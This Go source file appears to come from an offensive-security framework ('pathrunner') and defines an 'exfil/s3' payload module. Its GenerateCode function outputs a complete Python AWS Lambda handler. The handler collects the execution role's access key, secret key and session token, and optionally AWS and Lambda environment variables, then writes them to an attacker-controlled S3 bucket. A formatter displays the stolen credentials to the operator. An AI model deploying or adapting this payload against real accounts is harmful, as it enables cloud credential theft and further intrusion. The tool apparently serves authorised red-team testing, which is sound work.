// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package lambda

import (
	"encoding/json"
	"fmt"
	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
	"strings"
)

type ExfilS3Payload struct{}

func init() {
	payloads.Register(&ExfilS3Payload{})
}

func (p *ExfilS3Payload) GetName() string {
	return "exfil/s3"
}

func (p *ExfilS3Payload) GetDescription() string {
	return "Exfiltrate Lambda execution role credentials to an attacker-controlled S3 bucket"
}

func (p *ExfilS3Payload) GetTags() []string {
	return []string{
		payloads.TagServiceLambda,
		payloads.TagLanguagePython,
		payloads.TagTechniqueExfil,
		payloads.TagTransportFilesystem,
	}
}

func (p *ExfilS3Payload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "EXFIL_BUCKET",
			Description: "Attacker-controlled S3 bucket name for credential exfiltration",
			Required:    true,
		},
		{
			Name:        "EXFIL_PREFIX",
			Description: "S3 key prefix for the exfiltrated data",
			Required:    false,
			Default:     "exfil/",
		},
		{
			Name:        "INCLUDE_ENV",
			Description: "Include Lambda environment variables in the exfiltrated payload (true/false)",
			Required:    false,
			Default:     "false",
		},
	}
}

func (p *ExfilS3Payload) Validate(options map[string]string) error {
	bucket := options["EXFIL_BUCKET"]
	if bucket == "" {
		return fmt.Errorf("EXFIL_BUCKET is required for exfil/s3 payload")
	}
	if strings.HasPrefix(bucket, "s3://") {
		return fmt.Errorf("EXFIL_BUCKET should be the bucket name only, not an S3 URI")
	}
	return nil
}

func (p *ExfilS3Payload) GenerateCode(options map[string]string) (string, error) {
	code := `import json
import boto3
import os
import time

def lambda_handler(event, context):
    exfil_bucket = os.environ.get('EXFIL_BUCKET', '')
    exfil_prefix = os.environ.get('EXFIL_PREFIX', 'exfil/')
    include_env = os.environ.get('INCLUDE_ENV', 'false').lower() == 'true'

    try:
        sts = boto3.client('sts')
        identity = sts.get_caller_identity()
        session = boto3.Session()
        credentials = session.get_credentials()

        payload = {
            'type': 'lambda_credential_exfil',
            'timestamp': int(time.time()),
            'caller_identity': {
                'account': identity['Account'],
                'arn': identity['Arn'],
                'user_id': identity['UserId']
            },
            'region': session.region_name or os.environ.get('AWS_REGION', 'unknown'),
            'function_info': {
                'name': context.function_name,
                'version': context.function_version,
                'memory_limit': context.memory_limit_in_mb,
                'log_group': context.log_group_name
            }
        }

        identity_data = ''
        if credentials:
            payload['credentials'] = {
                'access_key_id': credentials.access_key,
                'secret_access_key': credentials.secret_key,
                'session_token': credentials.token
            }
            identity_data = (
                '--- PATHFINDER_IDENTITY_DATA ---\n'
                f'NAME=lambda-role/{identity["Arn"].split("/")[-1]}\n'
                f'TYPE=keys\n'
                f'ACCESS_KEY_ID={credentials.access_key}\n'
                f'SECRET_ACCESS_KEY={credentials.secret_key}\n'
            )
            if credentials.token:
                identity_data += f'SESSION_TOKEN={credentials.token}\n'
            identity_data += (
                f'REGION={session.region_name or os.environ.get("AWS_REGION", "unknown")}\n'
                f'AUTO_SWITCH=false\n'
                '--- END_PATHFINDER_IDENTITY_DATA ---'
            )

        if include_env:
            env_vars = {k: v for k, v in sorted(os.environ.items())
                        if k.startswith(('AWS_', 'LAMBDA_'))}
            payload['environment'] = env_vars

        # Write credentials to attacker S3 bucket
        s3 = boto3.client('s3')
        exfil_key = f"{exfil_prefix}{identity['Account']}/{int(time.time())}.json"

        s3.put_object(
            Bucket=exfil_bucket,
            Key=exfil_key,
            Body=json.dumps(payload, indent=2),
            ContentType='application/json'
        )

        return {
            'statusCode': 200,
            'body': json.dumps({
                'status': 'success',
                'message': f'Credentials written to s3://{exfil_bucket}/{exfil_key}',
                'exfil_bucket': exfil_bucket,
                'exfil_key': exfil_key,
                'identity_data': identity_data
            })
        }

    except Exception as e:
        return {
            'statusCode': 500,
            'body': json.dumps({
                'status': 'error',
                'message': f'S3 exfiltration failed: {str(e)}'
            })
        }
`

	return code, nil
}

func (p *ExfilS3Payload) ProcessResult(result string) (string, error) {
	var lambdaResponse map[string]interface{}
	if err := json.Unmarshal([]byte(result), &lambdaResponse); err != nil {
		return result, err
	}

	body, ok := lambdaResponse["body"].(string)
	if !ok {
		return result, nil
	}

	var parsedBody map[string]interface{}
	if err := json.Unmarshal([]byte(body), &parsedBody); err != nil {
		return result, err
	}

	var output strings.Builder
	output.WriteString("=== S3 Exfiltration Results ===\n\n")

	if status, ok := parsedBody["status"].(string); ok {
		if status == "success" {
			output.WriteString("Credentials exfiltrated successfully!\n\n")

			if bucket, ok := parsedBody["exfil_bucket"].(string); ok {
				output.WriteString("Bucket: " + bucket + "\n")
			}

			if key, ok := parsedBody["exfil_key"].(string); ok {
				output.WriteString("S3 Key: " + key + "\n")
			}

			if message, ok := parsedBody["message"].(string); ok {
				output.WriteString("Location: " + message + "\n")
			}

			if identityData, ok := parsedBody["identity_data"].(string); ok && identityData != "" {
				output.WriteString("\n" + identityData + "\n")
			}

		} else {
			output.WriteString("S3 exfiltration failed\n")
			if message, ok := parsedBody["message"].(string); ok {
				output.WriteString("Error: " + message + "\n")
			}
		}
	}

	return output.String(), nil
}
